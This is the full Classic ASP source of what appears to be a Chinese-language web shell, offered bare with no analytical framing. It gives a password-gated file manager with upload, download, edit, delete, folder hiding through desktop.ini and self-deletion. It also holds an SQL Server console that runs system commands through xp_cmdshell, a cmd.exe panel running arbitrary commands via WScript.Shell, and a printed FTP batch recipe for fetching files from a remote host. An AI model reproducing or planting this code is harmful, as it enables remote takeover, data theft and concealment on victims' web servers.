
if request("userpass")=mypass then
session("admin")=mypass
end if

if request("logout")="退出登录" then
session("admin")=""
end if

if session("admin")="" then
response.write"<table width=500 border=0 align=center cellpadding=0 cellspacing=1 class=box>"
response.write"<form method=POST action=''>"
response.write"<tr height=18>" 
response.write"<td height=25 align=center bgcolor=#003366 style=color:#ffffff>密码:&nbsp; "
response.write"<input type='password' name='userpass' size='20'>"
response.write"<input name='submit' type='submit' value='登录'>"
response.write"</td></tr></form></table>"
response.End()
end if
%>
<OBJECT RUNAT=Server ID=fs 
classid='clsid:0D43FE01-F093-11CF-8940-00A0C9054228'></OBJECT>

<%gl=rq("gl"):if gl<>"" then Session("gl")=gl
Response.Clear:echo " "
echo "<a href="&self&"?gl=file>file</a> "
echo "<a href="&self&"?gl=sql>sql</a> "
echo "<a href="&self&"?gl=cmd>cmd</a> "
echo "<a href="&self&"?gl=listapp>listapp</a> "

pwd1="file":pwd2="sql":pwd3="cmd":pwd4="listapp":if Session("gl")="file" then

if left(aduser,4)="fso:" then
 fso=mid(aduser,5)
else
 fso="scripting.filesystemobject"
end if
echo fso
AdodbS="Adodb.Stream"
on error resume next
bbf=chr(13)&chr(10):y=chr(34):self=Request("URL")
function echo(lpstr):response.write lpstr:end function
function rq(lpstr):rq=request(lpstr):end function
function close():echo "<script>opener.document.location.reload();opener=null;self.close();</script>":response.end:end function


echo "<script>"&bbf
echo "window.onerror=x_err;function x_err(sMsg,sUrl,sLine){return true}"&bbf
echo ""&"var url="""&replace(self,"\","\\")&""";"&""&bbf
echo "function sattw(srcf){w=ow(350);w.location=url+""?fdo=gattr&fp1=""+srcf;}"&bbf
echo "function ren(f1,f2){location=url+""?fdo=ren&fp1=""+fp1+f1+""&fp2=""+fp1+document.all[f2].value;}"&bbf
echo "function downall(){ow(600).document.write(down);}"&bbf
echo "function replace(aa,bb,cc){var lpabc,lpi;for(lpi=0;lpi<1000;lpi++){lpabc=aa;aa=aa.replace(bb,cc);if(lpabc==aa)return aa;}return aa;}"&bbf
echo "function ow(w){return window.open("""","""",""scrollbars=no,toolbar=no,location=no,directories=no,status=no,menubar=no,resizable=no,height=300,width=""+w);}"&bbf
echo "</script>"&bbf
echo "<STYLE>body,td,span,div,a{FONT-SIZE:9pt;text-decoration:none}"&bbf
echo "span,a{cursor:hand;color:blue;}hr{height:1px;line-height:1px;color:#0000ff;}"&bbf
echo "</style><body Leftmargin=6 Topmargin=2>"&bbf

if not isobject(fs) then set fs= server.createobject(fso)
if fdo="" then fdo=lcase(request("fdo"))
fp1=request("fp1")
fp2=request("fp2")
if fdo="up" and Request.TotalBytes>20 then
 set dr1=server.CreateObject(AdodbS):dr1.Mode=3:dr1.Type=1:dr1.Open
 set dr2=server.CreateObject(AdodbS):dr2.Mode=3:dr2.Type=1:dr2.Open
 lnBytes=Request.BinaryRead(Request.TotalBytes)
 SignLen=Instrb(1,lnBytes,CStrB(bbf))-1
 Sign=MidB(lnBytes,1,SignLen)
 fname=tractName(getfilename()) '取文件名
 fp1=getvalue("fp1") '取路径值
 if fname<>"" and fp1<>"" then
  savefile(fp1&fname)
 else
  echo "文件名或路径错!"
 end if
 dr1.Close
 dr2.Close
 set dr1=nothing
 set dr2=nothing
 response.redirect self&"?fp1="&parentdir(fp1&"\")
end if
if fdo="down" then
 downFile(fp1)
 response.end
end if
if fdo="hide" then
 fp1=pn(fp1):fp2=fp1&"\desktop.ini"
 if not fs.fileExists(fp2) then
 fs.getfolder(fp1).attributes=22
 lr="[.ShellClassInfo]"+bbf+"CLSID={645FF040-5081-101B-9F08-00AA002F954E}"
 fs.createtextfile(fp2).Write lr
 fs.getfile(fp2).attributes=6
 echo "<script>alert('此目录已隐藏！');"
 else
 fs.getfolder(fp1).attributes=48
 fs.DeleteFile fp2,True
 echo "<script>alert('此目录已解除隐藏！');"
 end if
 echo "history.go(-1);</script>":response.end
end if
if fdo="adddir" then
 fp1=pn(fp1):fs.createfolder(fp1)
 response.redirect self&"?fp1="&fp1&"\"
end if
if fdo="newfile" then
 fp1=pn(fp1):if not fs.fileExists(fp1) then fs.createtextfile(fp1)
 response.redirect self&"?fp1="&parentdir(fp1&"\")
end if
if fdo="sedit" then
 fs.getfile(fp1).attributes=32
 fs.CreateTextFile(fp1).Write replace(Request("fp2"),"<_/"&"textarea>","</tex"&"tarea>")
 echo "<script>opener=null;self.close();</script>":response.end
end if
if fdo="gedit" then
 att=fs.getfile(fp1).attributes
 echo "<form METHOD=POST action="""&self&"""><input size=80 type=text name=fp1 value="""&fp1&"""><br>"
 echo "<input name=fdo value=sedit type=hidden><textarea cols=90 rows=20 name=fp2>"
 wj=fs.OpenTextFile(fp1,1,0,0).read(5000000)
 echo replace(replace(wj,"</tex"&"tarea>","<_/"&"textarea>"),"</TEX"&"TAREA>","<_/"&"textarea>")
 echo "</textarea><center><input type=submit value=-------保存-------> <a onclick=opener=null;self.close();>放弃</a></form>"
 response.end
end if
if fdo="ren" then
 if fs.fileExists(fp1) then fs.movefile fp1,fp2
 if fs.folderExists(fp1) then fp1=pn(fp1):fs.movefolder fp1,pn(fp2):fp1=fp2
 response.redirect self&"?fp1="&parentdir(fp1&"\")
end if
if fdo="del" then
 if fs.fileExists(fp1) then fs.DeleteFile fp1,True
 if fs.folderExists(fp1) then fp1=pn(fp1):fs.Deletefolder fp1,True
 fp1=parentdir(fp1&"\")
 response.redirect self&"?fp1="&parentdir(fp1&"\")
end if
if fdo="copy" then
 if fs.fileExists(fp1) then fs.CopyFile fp1,fp2
 if fs.folderExists(fp1) then fs.Copyfolder pn(fp1),pn(fp2)
 close
end if
if fdo="sattr" then
 if fs.fileExists(fp1) then fs.getfile(fp1).attributes=fp2 or 32
 if fs.folderExists(fp1) then fs.getfolder(fp1).attributes=fp2 or 32
 echo "<script>opener=null;self.close();</script>":response.end
end if
if fdo="gattr" then
 if fs.fileExists(fp1) then att=fs.getfile(fp1).attributes
 if fs.folderExists(fp1) then att=fs.getfolder(fp1).attributes
 echo "<form name=fgs METHOD=POST action="""&self&""">"&fp1&"<br><input type=hidden name=fp1 value="""&fp1&""">"
 echo "只读<input type=checkbox name=c1 ":if att and 1 then echo "checked"
 echo ">　隐藏<input type=checkbox name=c2 ":if att and 2 then echo "checked"
 echo ">　系统<input type=checkbox name=c3 ":if att and 4 then echo "checked"
 echo "><center><br><input name=fdo value=sattr type=hidden><input name=fp2 value="&att&" type=hidden>"
 echo "<a onclick='var s=0;if(c1.checked)s+=1;if(c2.checked)s+=2;;if(c3.checked)s+=4;fp2.value=s;fgs.submit();'>修改</a></form>"
 response.end
end if

'开始
if request("fp1")<>"" then session("fp1")=request("fp1")
if fp1="" then fp1=session("fp1")
echo "<table border=0 cellspacing=0 cellpadding=0><tr><td>"
echo "<form name=fu method=post action="""&self&"?fdo=up"" enctype=multipart/form-data>"
for each d in fs.drives '盘符
 drv=d.DriveLetter
 echo "<a href="""&self&"?fp1="&drv&":\"">"&drv&Tran(d.DriveType)&"</a> &nbsp"
next

n=parentdir(fp1)
echo "<input type=hidden name=fp1 value="""&fp1&""">"
echo "<input type=file size=9 name=file1><input type=submit value=上传></td></form></tr>"
echo "<tr><td><form name=f><input size=30 name=fp1 value="""&fp1&""">"
fp1=replace(fp1,"\","/")
if n<>"" then
 echo "<a onclick=""sattw('"&fp1&"')"">属性</a> "
 echo "<a onclick=""cpy('"&fp1&"')"">复制</a> "
 echo "<a onclick=if(confirm('你确定要删除当前目录吗？'))location='"&self&"?fdo=del&fp1="&fp1&"'>删除</a> "
 echo "<a href='"&self&"?fdo=hide&fp1="&fp1&"'>隐藏</a> "
 echo "<a href=""javascript:location='"&self&"?fdo=ren&fp1="&fp1&"&fp2='+document.all.f.fp1.value;"">改名</a> "
end if
echo "<a href=""javascript:location='"&self&"?fdo=adddir&fp1="&replace(fp1,"\","/")&"'+document.all.fu.file1.value;"">新文件夹</a> "
echo "<a href=""javascript:location='"&self&"?fdo=newfile&fp1="&replace(fp1,"\","/")&"'+document.all.fu.file1.value;"">新文件</a> "

echo " <a onclick=downall();>下载</a></td></tr></form></table>"
echo "[<a href="""&self&"?fp1="&server.mappath(".")&"\"">程序目录</a>]"
echo "[<a href="""&self&"?fp1="&server.mappath("\")&"\"">网站目录</a>]"
sef=replace(request("PATH_TRANSLATED"),"\","/")
echo "[<a target="&sef&" href='"&self&"?fdo=gedit&fp1="&sef&"'>编辑本文件</a>]"
echo "[<a onclick=if(confirm('你确定要自删除吗？'))location='"&self&"?fdo=del&fp1="&sef&"'>自杀</a>]"
echo "[<a href=javascript:sattw("""&sef&""")>本文件属性</a>]"
echo "[<a href=javascript:cpy("""&sef&""")>复制本文件</a>]"


fp1=replace(fp1,"/","\")
if fp1="" then response.end
if n<>"" then echo "[<a href="""&self&"?fp1="&n&""">..</a>]"
echo "<br>"
Set fdir=fs.GetFolder(fp1) '目录
fp1=replace(fp1,chr(38),"%26")
c=0:For each n in fdir.SubFolders
 c=c+1:echo "[<a href="""&self&"?fp1="&fp1&replace(n.name,chr(38),"%26")&"\"">"&n.name&"</a>]"
Next

echo "以上总共个<font color=red>"&c&"</font>子目录<center><hr>"&bbf
echo "<table width=760 border=0 cellspacing=1 cellpadding=0><script>"&bbf

echo "var fp1="""&replace(fp1,"\","\\")&""";"


echo "var c="""",itm=0,down="""";"&bbf
echo "function cpy(srcf)"&bbf
echo "{w=ow(400);w.moveTo(100,200);"&bbf
echo "z=""<form method=post action=\""""+url+""?fdo=copy\"">"";"&bbf
echo "z+=""从<input size=53 name=fp1 value=\""""+srcf+""\""><br>到<input size=53 name=fp2 value=\""""+srcf+""\"">"";"&bbf
echo "z+=""<center><input type=submit value=--复制--></form>"""&bbf
echo "w.document.write(z);}"&bbf
echo "function sf(lpstr,lpsize)"&bbf
echo "{var p1,p2,z;"&bbf
echo "if(!(parseInt((itm)/2)%2))c=""#cccccc"";else c=""#ffffff"";"&bbf
echo "itm++;p1=""<td><a href=\""""+url+""?fdo="";"&bbf
echo "p2=""&fp1=""+fp1+lpstr+""\"">"";"&bbf
echo "z="""";if(itm%2)z=""<tr bgcolor=""+c+"">"";"&bbf
echo "z+=""<td><a href='javascript:sattw(\""""+replace(fp1,""\\"",""/"")+lpstr+""\"")'>属性</a></td>"";"&bbf
echo "z+=""<td><a target=\""""+lpstr+""\"" href=\""""+url+""?fdo=gedit&fp1=""+fp1+lpstr+""\"">编辑</a></td>"";"&bbf
echo "z+=""<td><a href='javascript:cpy(\""""+replace(fp1,""\\"",""/"")+lpstr+""\"")'>复制</a></td>"";"&bbf
echo "z+=""<td width=178><input size=20 name=o""+itm+"" value=\""""+lpstr+""\"" style=background-color:""+c+"";><a onclick=ren(\""""+lpstr+""\"",\""o""+itm+""\"");>改名</a></td>"";"&bbf
echo "if(lpsize>0){z+=p1+""down""+p2+""下载</a></td>"";down+=""[<a href=\""""+url+""?fdo=down""+p2+lpstr+""</a>]"";}else z+=""<td></td>"""&bbf
echo "//z+=p1+""del""+p2+""删除</a></td>"";"&bbf
echo "z+=""<td><a onclick=if(confirm('你确定要删除吗？'))location='""+url+""?fdo=del&fp1=""+replace(fp1,""\\"",""/"")+lpstr+""';>删除</a></td>"";"&bbf
echo "z+=""<td title='""+lpsize/1000000+""M""+""' ondblclick=location='""+url+""?gl=sql&pass=islogin&host=""+replace(fp1,""\\"",""/"")+lpstr+""'>""+lpsize+""</td>"";"&bbf
echo "if(!(itm%2))z+=""</tr>"";else z+=""<td bgcolor=#aaaaaa width=30> </td>"""&bbf
echo "document.write(z);"&bbf
echo "}"&bbf
c=0:For each n in fdir.Files '文件
 c=c+1:echo "sf('"&replace(n.name,chr(38),"%26")&"','"&n.size&"');"
next
echo "</script></table>以上总共<font color=red>"&c&"</font>个文件<hr>"

 

 

function getvalue(lpitem)
 pstr="name="&chr(34)&lpitem&chr(34)
 startpos=instrb(1,lnBytes,CstrB(pstr))
 if startpos<2 then getvalue="":exit function
 startpos=instrb(startpos,lnBytes,CstrB(bbf&bbf))+4
 EndPos=instrb(startpos,lnBytes,Sign)-2
 getvalue=BtoS(midb(lnBytes,startpos,EndPos-startpos))
end function
function getfdata()
 dim lpdata(1)
 startpos=instrb(1,lnBytes,CstrB("filename="""))
 if startpos<2 then getfdata="":exit function
 startpos=instrb(startpos,lnBytes,CStrB(bbf&bbf))+4
 EndPos=instrb(startpos,lnBytes,Sign)-2
 getfdata=(startpos-1)&","&(EndPos-startpos)
end function
function savefile(lpFileName)
 fdata=getfdata()
 fdata=split(fdata,",")
 if fdata(0)<1 or fdata(1)<1 then savefile=-1:exit function
 dr1.write lnBytes
 dr1.position=fdata(0)
 dr1.copyto dr2,fdata(1)
 dr2.SaveToFile lpFileName,2
end function
function getfilename()
 startpos=instrb(1,lnBytes,CstrB("filename="&chr(34)))+10
 if startpos<2 then getfilename="":exit function
 EndPos=instrb(startpos,lnBytes,CstrB(""""))
 getfilename=BtoS(midb(lnBytes,startpos,EndPos-startpos))
end function
Function  BtoS(Binstr)
 skipflag=0
 strC=""
 If Not IsNull(binstr) Then
 lnglen=LenB(binstr)
 For ix=1 To lnglen
 If skipflag=0 Then
 tmpBin=MidB(binstr,ix,1)
 If AscB(tmpBin)>127 Then
 strC=strC&Chr(AscW(MidB(binstr,ix+1,1)&tmpBin))
 skipflag=1
 Else
 strC=strC&Chr(AscB(tmpBin))
 End If
 Else
 skipflag=0
 End If
 Next
 End If
 BtoS  =  strC
End  Function
Function CStrB(ByRef psUnicodeString)
 Dim lnLength
 Dim lnPosition
 lnLength = Len(psUnicodeString)
 For lnPosition = 1 To lnLength
  CStrB = CStrB & ChrB(AscB(Mid(psUnicodeString, lnPosition, 1)))
 Next
End Function
Function tractName(lpfilename)
 nlen=len(lpfilename)
 For lpx = nlen To 1 step -1
  if mid(lpfilename,lpx,1)="\" then
   tractName=mid(lpfilename,lpx+1,100)
   exit Function
  end if
 Next
 tractName=""
End Function
function parentdir(t)
 t=replace(t,"/","\")
 ls=split(t,"\")
 for x=0 to ubound(ls)-2
 parentdir=parentdir+ls(x)&"\"
 next
 parentdir=replace(parentdir,chr(38),"%26")
End function
function pn(t)
 pn=replace(t,"/","\")
 if right(pn,1)="\" then pn=left(pn,len(pn)-1)
 if right(pn,1)="\" then pn=left(pn,len(pn)-1)
End function
function downFile(strFile)
 Response.Buffer = True
 Response.Clear
 Set s=Server.CreateObject(AdodbS)
 s.Open
 s.Type=1
 if not fs.FileExists(strFile) then Response.Write(strFile&"文件不存在！"):Response.End
 Set f=fs.GetFile(strFile)
 intFilelength=f.size
 s.LoadFromFile(strFile)
 if err then Response.Write("读文件出错:"&err.Description):Response.End
 Response.AddHeader "Content-Disposition", "attachment; filename=" & f.name
 Response.AddHeader "Content-Length", intFilelength
 Response.CharSet = "UTF-8"
 Response.ContentType = "application/octet-stream"
 Response.BinaryWrite s.Read
 response.flush
 response.clear
 s.Close
 Set s = Nothing
End Function 
function Tran(drv)
select case drv:case 0:Tran="怪盘":case 1:Tran="软盘":case 2:Tran="硬盘"
case 3:Tran="网络":case 4:Tran="光盘":case 5:Tran="RAM":end select:end function
response.end


end if
if Session("gl")="sql" then

function delhtml(str):delhtml=server.htmlencode(ltrim(str)):end function
function srs(lpstr)
 if isnull(lpstr) then
  srs=""
 else
  srs=lpstr
 end if
end function
self=request("url")
server.scriptTimeout=100000
bbf=chr(13)&chr(10)


echo "<title>sqlserver数据管理v0.2</title><meta http-equiv=""pragma"" content=""no-cache""><style>"&bbf
echo "form {color:#00000;font-size:9pt;}"&bbf
echo "table {color:#00000;font-size:9pt;}"&bbf
echo "body {color:#00000;font-size:9pt;}"&bbf
echo "span {cursor:hand;color:red;background-color:black;}"&bbf
echo "</style><script>function copys(s){"&bbf
echo "document.all.sqlstr.value=s;"&bbf
echo "}</script>"&bbf
echo "<script language=""javascript"">"&bbf
echo "function nom(){event.cancelBubble = true;event.returnValue = false;return false;}"&bbf
echo "function click() {if (event.button==2) {movable=(!movable);}nom();}"&bbf
echo "document.oncontextmenu=click"&bbf
echo "document.onmousedown=click"&bbf
echo "</script>"&bbf
echo "<body Leftmargin=""6"" Topmargin=""140"" onload=movediv()>"&bbf
echo "<script>"&bbf
echo "var movable=0;"&bbf
echo "function movediv(){"&bbf
echo "if(movable==1){"&bbf
echo "toolb.style.pixelTop= document.body.scrollTop;"&bbf
echo "toolb.style.pixelLeft= document.body.scrollLeft;"&bbf
echo "movs.innerHTML=""不浮动"";}"&bbf
echo "else{toolb.style.pixelTop= 0;toolb.style.pixelLeft= 0;"&bbf
echo "movs.innerHTML=""浮动"";}"&bbf
echo "setTimeout('movediv()',200);"&bbf
echo "}"&bbf
echo "</script>"&bbf
echo "<div id=toolb style=""position:absolute;Left:10px;Top:0px;width:100%;background-color:#eeeeee""> "&bbf
echo "<table cellspacing=0 cellpadding=0 width=100% border=1><tr><td>"&bbf
echo "<form action="""&self&"?table="&request("table")&""" method=post name=form1>"&bbf
echo "<span onclick=document.location="""&self&"?c=3"">显示库列表</span> -"&bbf
echo "<span onclick=document.location="""&self&"?c=1"">显示所有表</span> -"&bbf
echo "<span onclick=sel();>显示当前表</span> -"&bbf
echo "<span onclick=ins();>insert</span> -"&bbf
echo "<span onclick=del();>delete</span> -"&bbf
echo "<span onclick=drop();>drop</span> -"&bbf
echo "<span onclick=createt();>create</span> -"&bbf
echo "只显[<span onclick=document.location="""&self&"?c=100"">仅用户表</span>"&bbf
echo "<span onclick=document.location="""&self&"?c=101"">所有表</span>"&bbf
echo "<span onclick=document.location="""&self&"?c=102"">仅前20条</span>"&bbf
echo "<span onclick=document.location="""&self&"?c=103"">所有条</span>] -"&bbf
echo "[<span onclick=document.location="""&self&"?c=886"">exit</span>]"&bbf
echo "<script>function createt(){document.all.sqlstr.value='create table "&session("dbo")&"[] ([id] int identity(1,1)/*mdb=autoincrement*/)';}</script>"&bbf
echo "<textarea name=sqlstr cols=106 rows=5>"&request("sqlstr")&"</textarea><br>"&bbf
echo "<input type=submit name=ppp value=runsql>"&bbf
echo "<input type=submit name=ppp value=rundos>"&bbf
echo "<input type=""checkbox"" value=""n"" name=""sc"">不显示结果"&bbf
echo "<span id=movs onclick=""javascript:movable=(!movable)"">浮动</span>"&bbf
echo "</td></tr></form></table></div>"&bbf


if request("c")=886 then
 session("islogin")=""
 response.write "<script>location='"&self&"';</script>"
 response.end
end if
if session("islogin")<>"ok" then
 pass=request("pass")
 if pass="islogin" then
  session("islogin")="ok"
 else
  

echo "<div style=position:absolute;width:100%;Left:10px;Top:150px;><form method=post>"&bbf
echo "  <input type=hidden name=pass value=islogin><br>"&bbf
echo "  host:<input type=text name=host value="&sahost&"><br>"&bbf
echo "  user:<input type=text name=user value="&sauser&"><br>"&bbf
echo "  pass:<input type=text name=upass value="&sapass&"><br>"&bbf
echo "  dbase<input type=text name=database value="&request("database")&"><br>"&bbf
echo "  <input type=submit></form></div>"

  response.end
 end if
end if

 

function echo(lpstr):response.write lpstr:end function
Function GetTableFromSQL(Byval SQL)
 Dim charPos, charLen, wordlist
 SQL = LCase(SQL)
 charPo1 = InStr(1, SQL, " from ")
 if charPo1<1 then charPo1 = InStr(1, SQL, " into ")
 if charPo1<1 then charPo1 = InStr(1, SQL, "update")
 if charPo1>0 then
  charPo2 = InStr(charPo1+7, SQL, " ")
  If charPo2 > 0 Then
   SQL = Mid(SQL, charPo1+6, charPo2)
  Else
   SQL = Mid(SQL, charPo1+6)
  End If
  If Left(SQL, 1) = "[" Then SQL = Mid(SQL, 2)
  If Right(SQL, 1) = "]" Then SQL = Left(SQL, Len(SQL) - 1)
  GetTableFromSQL = SQL
 end if
End Function

dsnname     =  "data source="&request("host")&";"
dsnusername =  "user id="&request("user")&";"
if request("upass")<>"" then dsnpassword = "password="&request("upass")&";"
if request("database")<>"" then session("schoolname")=request("database"):response.redirect self&"?c=1"
if session("schoolname")="" then session("schoolname")= "master"


set adoconn = server.createobject("adodb.connection")
if request("host")<>"" then
 if mid(lcase(request("host")),2,1)=":" then
  connectionstring="DRIVER={Microsoft Access Driver (*.mdb)};DBQ="&_
   request("host")&";pwd="&request("upass")
  echo connectionstring
  session("IsMDB")=1
  session("dbo")=""
  session("dsnname")=request("host")
 else
  session("dsnname")=dsnname
  connectionstring = "provider=sqloledb.1;"&dsnname&dsnusername&dsnpassword
  session("IsMDB")=0
  session("dbo")="[dbo]."
 end if
 session("connectionstring")=connectionstring
 session("only_top_20")="top 20"
end if
echo session("dsnname")&"<br>"
adoconn.open session("connectionstring")
adoconn.cursorlocation=3
if session("IsMDB")=0 then adoconn.execute("use "&session("schoolname"))

command=request("c")
sqlstr=request.form("sqlstr")
table=request("table")
if table="" then table=GetTableFromSQL(sqlstr)


if len(sqlstr)>0 then
  if left(sqlstr,5)="edit " then sprocedure(mid(sqlstr,6)):sqlstr=""
  if left(sqlstr,4)="all " then run_ml(mid(sqlstr,5)):sqlstr=""
  runsqls=split(sqlstr,bbf)
  for k=0 to ubound(runsqls)
   if request("ppp")="rundos" then
    runsqls(k)="exec master.dbo.xp_cmdshell '"&runsqls(k)&"'"

   end if
   echo runsqls(k)&"----"&"<br>"
   if len(runsqls(k))>0 then
    set rs=adoconn.execute(runsqls(k))
    if request("sc")<>"n" then
     if request("ppp")<>"rundos" then
      showsss rs
     else
      for oi=1 to rs.recordcount
       reword=srs(rs(0).value)
       if reword<>"" then
        reword=replace(reword,"<",chr(38)&"lt")
        reword=replace(reword,"  "," &nbsp")
        echo reword&"<br>"&bbf
       end if
       rs.movenext
      next
     end if
    end if
   end if
  next
end if


if command=1 then
 if session("IsMDB")=1 then
  Set ADOX = Server.CreateObject("ADOX.Catalog")
  ADOX.ActiveConnection = adoconn
  For Each tb in ADOX.Tables
   If tb.Type = "TABLE" Then
   

echo "   <a href="&self&"?c=2&table="&tb.Name&">"&bbf
echo "    "&tb.Name &"</a><br>"&bbf
echo "   "
End If
  Next
  response.end
 else
  sql="select name from sysobjects where "&_
   "objectproperty(object_id(name),'istable')=1"&session("only_user_table")
  set rs=adoconn.execute(sql)
  for iz=1 to rs.recordcount
   echo "<a href="&self&"?c=2&table="&rs(0).value&_
    ">"&rs(0).value&"</a><br>"
   rs.movenext
  next
 end if
end if

if command=2 then
 if table<>"" then
  set rs=adoconn.execute("select "&session("only_top_20")&" * from "&session("dbo")&table)
  showsss rs
  echo "</table>"
  echo "<script>"&scripts&"</script>"&insert
 end if
end if

if command=3 then
 set rs=adoconn.execute("select name,filename from master..sysdatabases")
 echo "<table>"
 for dd=1 to rs.recordcount
  echo "<tr><td><a href="&self&"?database="&rs(0).value&">"&rs(0).value&"</a></td><td>"&rs(1).value&"</td></tr>"
  rs.movenext
 next
 echo "</table>"
end if

if command=100 then session("only_user_table")=" and xtype='u'"::response.redirect self&"?c=1"
if command=101 then session("only_user_table")="":response.redirect self&"?c=1"
if command=102 then session("only_top_20")="top 20"
if command=103 then session("only_top_20")=""

set adoconn=nothing
function showsss(lprs)
 on error resume next
 countrs=lprs.fields.count
 echo "["&table&"]共"&countrs&"个列名,有"&lprs.recordcount&"条记录"
 response.flush
 echo "<table border=1 bordercolorlight=#000000 cellspacing=0 cellpadding=0 bordercolordark=#ffffff>"
 echo "<tr><td>&nbsp</td>"
 for lzi=1 to countrs
  echo "<td>"&lprs(lzi-1).name&"</td>"
  if lzi>1 then
   if lzi<>countrs then
    ins1=ins1&lprs(lzi-1).name&","
    if session("IsMDB")=1 then
     ins2=ins2&"'0',"
    else
     ins2=ins2&"/*"&lprs(lzi-1).name&"*/'0',"
    end if
   else
    ins1=ins1&lprs(lzi-1).name
    if session("IsMDB")=1 then
     ins2=ins2&"'0'"
    else
     ins2=ins2&"/*"&lprs(lzi-1).name&"*/'0'"
    end if
   end if
  end if
 next
 echo "</tr>"

 echo "<script>function ins(){document.all.sqlstr.value="&chr(34)&"insert into "&_
  session("dbo")&table&_
  "("&ins1&")values("&ins2&")"&chr(34)&";}</script>"
 echo "<script>function sel(){document.all.sqlstr.value="&chr(34)&"select * from "&session("dbo")&table&_
  chr(34)&";document.all.ppp.value='runsql';document.all.form1.submit();}</script>"
 echo "<script>function del(){document.all.sqlstr.value='delete from "&session("dbo")&table&" where [id]=99999';}</script>"
 echo "<script>function drop(){document.all.sqlstr.value='drop table "&session("dbo")&table&"';}</script>"

 if lprs.recordcount<1 then exit function
 for dd=1 to lprs.recordcount
  lpitem= "<tr><td>"&dd&"</td>"
  update="tt"&dd&"="&chr(34)&"update "&session("dbo")&table&" set "
  for lzj=1 to countrs
   if lzj=1 then where=" where ["&lprs(lzj-1).name&"]="&srs(lprs(lzj-1).value)
   vtype=lprs(lzj-1).type
   if vtype<>204 and vtype<>128 and vtype<>205 then
    ivalue=srs(lprs(lzj-1).value)
    ivalue=trim(ivalue)
    ivalue=replace(ivalue,"<","&lt")
    ivalue=replace(ivalue,"  "," &nbsp")

    svalue=replace(srs(lprs(lzj-1).value),"\","\\")
    svalue=replace(svalue,chr(34),"\"&chr(34))
    svalue=replace(svalue,chr(39),"\'\'")
    svalue=replace(svalue,"<",chr(34)&"+'<'+"&chr(34))
    if lzj>1 then
     update=update&"["&lprs(lzj-1).name&"]='"&svalue&"', "
    end if
    lpitem=lpitem&"<td>" '&ivalue
    lpitem=lpitem&ivalue&"&nbsp</td>"
   else
    lpitem=lpitem&"<td>{?}</td>"
   end if
  next
  lpitem=lpitem&"</tr>"
  update=left(update,len(update)-2)
  update=replace(update,chr(13)&chr(10),"\n")
  update=replace(update,chr(13),"\n")
  update=replace(update,chr(10),"\n")
  update=update&where&chr(34)&";"&chr(13)&chr(10)
  scripts=scripts&update

  echo "<a ondblclick=javascript:copys(tt"&dd&");>"&lpitem&"</a>"
  lprs.movenext
 next
 echo "</table>"
 echo "<script>"&scripts&"</script>"&insert
end function
function sprocedure(lpstr)
sql="SELECT text FROM syscomments WHERE id = OBJECT_ID('"&lpstr&"') ORDER BY colid" 'colid
 set rs=adoconn.execute(sql)
 on error resume next
 if rs.recordcount<1 then exit function
 for dd=1 to rs.recordcount
  procstr=procstr&rs(0).value
  rs.movenext
 next
echo "---------------(+)<br>"&replace(replace(server.htmlencode(procstr),bbf,"<br>"),"  "," &nbsp")&"<br>---------------(-)<br>"
end function
function run_ml(lpstr)
 set rs=adoconn.execute(lpstr)
 showsss rs
end function


echo "<br>"&bbf
echo "alter table TableName alter column ColName varchar(300) null<br>"&bbf
echo "@rem 用法sftp ip user pass file<br>"&bbf
echo "echo echo open ^%1^>ftp.bin>sftp.bat<br>"&bbf
echo "echo echo ^%2^>^>ftp.bin>>sftp.bat<br>"&bbf
echo "echo echo ^%3^>^>ftp.bin>>sftp.bat<br>"&bbf
echo "echo echo cd soft^>^>ftp.bin>>sftp.bat<br>"&bbf
echo "echo echo get ^%4^>^>ftp.bin>>sftp.bat<br>"&bbf
echo "echo echo quit^>^>ftp.bin>>sftp.bat<br>"&bbf
echo "echo ftp -s:ftp.bin>>sftp.bat<br>"&bbf
echo "echo del ftp.bin /f>>sftp.bat<br>"&bbf
echo "</body>"

end if
if Session("gl")="cmd" then
echo "<script>function replace(aa,bb,cc){var lpabc,lpi;for(lpi=0;lpi<1000;lpi++){lpabc=aa;aa=aa.replace(bb,cc);if(lpabc==aa)return aa;}return aa;}</script>"&bbf
'on error resume next
server.scripttimeout=99999999
function echo(lpstr):response.write lpstr:end function
function rq(lpstr):rq=request(lpstr):end function
bbf=chr(13)&chr(10):y=chr(34):self=Request("URL")

 

echo "<style>"&bbf
echo "input,textarea{color:#ffffff;border: 1 solid #000000;background-color:#000000;border-bottom: 1 solid #111111;}"&bbf
echo "body,input{font-family:新宋体;color:#bbbbbb;font-size:14px;}"&bbf
echo "</style>"&bbf
echo "<body bgcolor=black onload=document.all.CMDS.focus(); ondblclick=document.all.CMDS.focus(); onmouseup=document.all.CMDS.focus();>"&bbf

if not isobject(wsl) then set wsl=server.createobject("WSCRIPT.SHELL")

 

if err.number<>0 then echo err.number
szCMD =lcase(Request("fp1"))
if session("cmddrv")="" then session("cmddrv")="c:":session("cmdpath")="\"
yx=request("yx")
if left(szCMD,5)="save " then
 cmdsave mid(szCMD,6),request("cmdd")
 szCMD=""
end if
If (szCMD <> "") Then
 szTempFile =server.mappath(".")&"\"&tfile
 if len(szCMD)=2 and right(szCMD,1)=":"  then session("cmddrv")=szCMD:session("cmdpath")="\"
 if szCMD="cd\" or szCMD="cd \" then session("cmdpath")="\"
 if szCMD="cd.." or szCMD="cd .." then
  lps=split(session("cmdpath"),"\"):session("cmdpath")="\"
  for i=1 to ubound(lps)-2
   if lps(i)<>"" then session("cmdpath")=session("cmdpath")&lps(i)&"\"
  next
 end if
 if left(szCMD,3)="cd " and szCMD<>"cd .." and szCMD<>"cd ." then
  rdir=mid(szCMD,4):if right(rdir,1)<>"\" then rdir=rdir&"\"
  session("cmdpath")=session("cmdpath")&rdir
  if mid(rdir,2,1)=":" then
   session("cmdpath")=mid(rdir,3)
   session("cmddrv")=left(rdir,2)
  end if
 end if
 session("cmdpath")=replace(session("cmdpath"),"/","\")
 if session("cmdpath")<>"" then szCMD="cd "&session("cmdpath")&" & "&szCMD
 szCMD=session("cmddrv")&" & "&szCMD

 if yx<>"on" then
  words=wsl.exec("cmd.exe /c "&szCMD).stdout.readall
 else
  words=wsl.exec(zCMD).stdout.readall
 end if
End If

echo "<FORM action="""&Request("SCRIPT_NAME")&""" style=width:1500; method=""POST"" onsubmit=if(document.all.fp1.value.substring(0,4)!='save')document.all.cmdd.value='';document.all.cmdd.value=replace(document.all.cmdd.value,'<_/textarea','</textarea');>"&bbf
echo "<input type=""checkbox"" name=""yx"" value=""on"" onclick=CMDS.focus();>不用cmd解释"&bbf
echo "<a href=javascript:document.execCommand('ReFresh')>刷新</a><br>"&bbf

